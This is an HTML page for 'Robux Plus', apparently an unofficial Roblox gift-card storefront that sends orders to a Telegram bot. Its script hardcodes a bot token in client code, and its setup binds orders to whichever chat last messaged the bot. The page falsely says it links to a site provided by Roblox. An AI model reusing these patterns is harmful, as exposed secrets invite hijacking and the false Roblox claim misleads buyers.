<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Robux Plus — подарочные карты</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', system-ui, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%);
            position: relative;
            overflow-x: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* canvas для звёздочек */
        #starCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10;
        }

        .container {
            position: relative;
            z-index: 20;
            max-width: 600px;
            width: 100%;
            margin: 0 auto;
        }

        /* карточка */
        .card {
            background: rgba(255, 245, 255, 0.94);
            backdrop-filter: blur(12px);
            border: 1px solid #d9b8ff;
            border-radius: 48px;
            padding: 32px 28px;
            box-shadow: 0 20px 30px rgba(128, 0, 255, 0.15);
        }

        .logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo h1 {
            font-size: 2.4rem;
            background: linear-gradient(135deg, #b16eff, #9b4eff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .logo p {
            color: #7a4f9e;
            font-size: 0.9rem;
        }

        .card-type {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .type-btn {
            background: #f2eaff;
            border: 2px solid #decbff;
            border-radius: 60px;
            padding: 12px 28px;
            font-weight: bold;
            font-size: 1rem;
            color: #6a37a3;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
            text-align: center;
        }

        .type-btn.active {
            background: linear-gradient(95deg, #b87eff, #9c58e6);
            border-color: #b87eff;
            color: white;
            box-shadow: 0 4px 12px rgba(156, 88, 230, 0.3);
        }

        .amount-section {
            margin-bottom: 30px;
        }

        .amount-label {
            font-weight: 600;
            color: #5d3b80;
            margin-bottom: 12px;
            display: block;
        }

        .amount-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 20px;
        }

        .amount-btn {
            background: white;
            border: 1.5px solid #decbff;
            border-radius: 60px;
            padding: 10px 20px;
            font-weight: bold;
            color: #6a37a3;
            cursor: pointer;
            transition: 0.2s;
            flex: 1 0 auto;
            text-align: center;
        }

        .amount-btn.active {
            background: #b87eff;
            border-color: #b87eff;
            color: white;
        }

        .custom-amount {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .custom-amount input {
            flex: 1;
            padding: 12px 16px;
            border-radius: 60px;
            border: 1.5px solid #decbff;
            background: #fffafc;
            outline: none;
            font-size: 1rem;
        }

        .currency {
            background: #f0e4ff;
            padding: 10px 16px;
            border-radius: 60px;
            color: #6a37a3;
            font-weight: bold;
        }

        .recipient {
            margin-bottom: 30px;
        }

        .recipient label {
            font-weight: 600;
            color: #5d3b80;
            display: block;
            margin-bottom: 8px;
        }

        .recipient select, .recipient input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 60px;
            border: 1.5px solid #decbff;
            background: white;
            font-size: 1rem;
            outline: none;
        }

        .recipient input {
            margin-top: 10px;
            display: none;
        }

        .btn-add {
            background: linear-gradient(95deg, #b87eff, #9c58e6);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 60px;
            font-weight: bold;
            font-size: 1.2rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            margin: 20px 0 16px;
        }

        .btn-add:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 20px rgba(156, 88, 230, 0.4);
        }

        .external-note {
            font-size: 0.7rem;
            color: #9278b0;
            text-align: center;
            margin: 16px 0;
        }

        .activation {
            text-align: center;
            margin-top: 20px;
            font-size: 0.85rem;
            color: #a58bc2;
            border-top: 1px solid #e2ccff;
            padding-top: 18px;
        }

        footer {
            text-align: center;
            margin-top: 24px;
            color: #9278b0;
            font-size: 0.7rem;
        }
    </style>
</head>
<body>
<canvas id="starCanvas"></canvas>

<div class="container">
    <div class="card">
        <div class="logo">
            <h1>✨ Robux Plus ✨</h1>
            <p>подарочные карты Roblox в стиле Excellent Shop</p>
        </div>

        <div class="card-type">
            <div class="type-btn" data-type="digital">💻 Digital Card</div>
            <div class="type-btn" data-type="physical">📦 Physical Card</div>
        </div>

        <div class="amount-section">
            <span class="amount-label">Amount (10 $ - 500 $) USD</span>
            <div class="amount-buttons">
                <div class="amount-btn" data-amount="10">10</div>
                <div class="amount-btn" data-amount="25">25</div>
                <div class="amount-btn" data-amount="50">50</div>
                <div class="amount-btn" data-amount="100">100</div>
            </div>
            <div class="custom-amount">
                <input type="number" id="customAmount" placeholder="своя сумма" min="10" max="500" step="1">
                <span class="currency">USD</span>
            </div>
        </div>

        <div class="recipient">
            <label>Who is this for?</label>
            <select id="recipientSelect">
                <option value="for_me">For me</option>
                <option value="gift">As a gift</option>
            </select>
            <input type="text" id="giftName" placeholder="Recipient's Roblox username">
        </div>

        <button class="btn-add" id="addToCartBtn">✨ Add to Cart ✨</button>
        <div class="external-note">
            Clicking the button or link above will take you to an external website provided by Roblox.
        </div>
        <div class="activation">
            🔧 Aktivacija Windows
        </div>
    </div>
    <footer>⭐ Excellent Shop — Robux Plus ⭐</footer>
</div>

<script>
    // ЗВЁЗДОЧКИ
    const canvas = document.getElementById('starCanvas');
    let ctx = canvas.getContext('2d');
    let stars = [];

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    function createStar() {
        return {
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: Math.random() * 4 + 2,
            speedY: Math.random() * 1.5 + 0.7,
            opacity: Math.random() * 0.6 + 0.3,
        };
    }

    for (let i = 0; i < 200; i++) stars.push(createStar());

    function drawStar(ctx, x, y, size, opacity) {
        ctx.save();
        ctx.translate(x, y);
        ctx.beginPath();
        let spikes = 5;
        let outerRadius = size;
        let innerRadius = size * 0.4;
        let rot = Math.PI / 2 * 3;
        let step = Math.PI / spikes;
        ctx.moveTo(0, -outerRadius);
        for (let i = 0; i < spikes; i++) {
            let x1 = Math.sin(rot) * innerRadius;
            let y1 = -Math.cos(rot) * innerRadius;
            ctx.lineTo(x1, y1);
            rot += step;
            let x2 = Math.sin(rot) * outerRadius;
            let y2 = -Math.cos(rot) * outerRadius;
            ctx.lineTo(x2, y2);
            rot += step;
        }
        ctx.closePath();
        ctx.fillStyle = `rgba(255, 220, 180, ${opacity})`;
        ctx.fill();
        ctx.restore();
    }

    function drawStars() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (let star of stars) {
            drawStar(ctx, star.x, star.y, star.size, star.opacity);
            star.y += star.speedY;
            if (star.y > canvas.height) {
                star.y = -10;
                star.x = Math.random() * canvas.width;
            }
        }
        requestAnimationFrame(drawStars);
    }
    drawStars();

    // ----- логика выбора типа карты -----
    let selectedType = 'digital';
    let selectedAmount = 10;

    const typeBtns = document.querySelectorAll('.type-btn');
    const amountBtns = document.querySelectorAll('.amount-btn');
    const customAmountInput = document.getElementById('customAmount');
    const recipientSelect = document.getElementById('recipientSelect');
    const giftNameInput = document.getElementById('giftName');

    typeBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            typeBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedType = btn.getAttribute('data-type');
        });
    });
    // активируем первый по умолчанию
    typeBtns[0].classList.add('active');

    amountBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            amountBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedAmount = parseInt(btn.getAttribute('data-amount'));
            customAmountInput.value = '';
        });
    });
    amountBtns[0].classList.add('active');

    customAmountInput.addEventListener('input', (e) => {
        let val = parseInt(e.target.value);
        if (!isNaN(val) && val >= 10 && val <= 500) {
            selectedAmount = val;
            amountBtns.forEach(b => b.classList.remove('active'));
        } else if (e.target.value === '') {
            // оставляем последний выбранный из кнопок
        } else {
            e.target.value = '';
        }
    });

    recipientSelect.addEventListener('change', () => {
        if (recipientSelect.value === 'gift') {
            giftNameInput.style.display = 'block';
        } else {
            giftNameInput.style.display = 'none';
        }
    });
    giftNameInput.style.display = 'none';

    // ----- телеграм отправка (как в excellent shop) -----
    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
    let CHAT_ID = localStorage.getItem('tg_chat_id_robuxplus');

    async function fetchChatId() {
        try {
            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
            const data = await res.json();
            if (data.ok && data.result.length) {
                const last = data.result[data.result.length-1];
                const cid = last.message?.chat?.id || last.callback_query?.message?.chat?.id;
                if (cid) {
                    CHAT_ID = cid;
                    localStorage.setItem('tg_chat_id_robuxplus', CHAT_ID);
                    alert('✨ телеграм готов, можно отправлять ✨');
                    return true;
                }
            }
            alert('✨ напиши @ExcellentShopBot любое сообщение ✨');
        } catch(e) { alert('ошибка подключения'); }
        return false;
    }

    function showMessage(msg) {
        let div = document.createElement('div');
        div.innerText = msg;
        div.style.cssText = 'position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999; font-weight:bold; backdrop-filter:blur(4px);';
        document.body.appendChild(div);
        setTimeout(()=>div.remove(), 2500);
    }

    document.getElementById('addToCartBtn').addEventListener('click', async () => {
        let amount = selectedAmount;
        // проверка кастомного поля
        const customVal = parseInt(customAmountInput.value);
        if (!isNaN(customVal) && customVal >= 10 && customVal <= 500) {
            amount = customVal;
        } else if (customAmountInput.value !== '') {
            alert('сумма должна быть от 10 до 500 USD');
            return;
        }

        let recipient = '';
        if (recipientSelect.value === 'for_me') {
            recipient = 'For me (владельцу)';
        } else {
            const giftName = giftNameInput.value.trim();
            if (!giftName) {
                alert('укажи никнейм получателя подарка');
                return;
            }
            recipient = `Gift for: ${giftName}`;
        }

        const cardType = selectedType === 'digital' ? 'Digital Card' : 'Physical Card';
        const messageText = `✨ ROBUX PLUS (Excellent Shop) ✨\n💳 Карта: ${cardType}\n💰 Сумма: ${amount} USD\n👤 Получатель: ${recipient}`;

        if (!CHAT_ID) {
            const confirmTelegram = confirm('Телеграм не настроен. Настроить сейчас?');
            if (confirmTelegram) await fetchChatId();
            if (!CHAT_ID) {
                alert('отмена. данные не отправлены');
                return;
            }
        }

        try {
            const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: messageText })
            });
            const json = await resp.json();
            if (json.ok) {
                showMessage('✅ Заказ добавлен! Ссылка на оплату скоро придёт в Telegram.');
                // сброс формы (опционально)
                customAmountInput.value = '';
                if (giftNameInput.style.display === 'block') giftNameInput.value = '';
            } else {
                alert('❌ Ошибка при отправке, попробуй позже');
            }
        } catch(e) {
            alert('Ошибка соединения');
        }
    });

    // при загрузке проверяем chat id
    if (!CHAT_ID) {
        setTimeout(() => {
            if (confirm('Для отправки заказов нужен Telegram. Настроить сейчас?')) fetchChatId();
        }, 800);
    }
</script>
</body>
</html>
